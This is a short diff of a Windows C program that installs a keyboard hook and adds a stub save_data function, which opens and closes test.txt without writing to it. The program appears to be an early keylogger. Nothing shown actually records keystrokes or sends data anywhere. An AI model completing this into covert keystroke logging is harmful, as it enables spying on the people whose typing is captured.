@@ -31,6 +31,19 @@ void	setwinhook()
 	CloseHandle(process.hThread);
 }
 
+void	save_data()
+{
+	FILE *file;
+	if (_wfopen_s(&file, L"test.txt", L"a+") != 0)
+		_wperror(" Open file failed ");
+
+	if (fclose(file) != 0)
+		_wperror(" Close file failed ");
+
+
+
+}
+
 int	main(void)
 {
 	MSG msg;
@@ -43,4 +56,6 @@ int	main(void)
 	}
 	UnhookWindowsHookEx(handlekeyboard);
 	return (msg.wParam);
+
+
 }
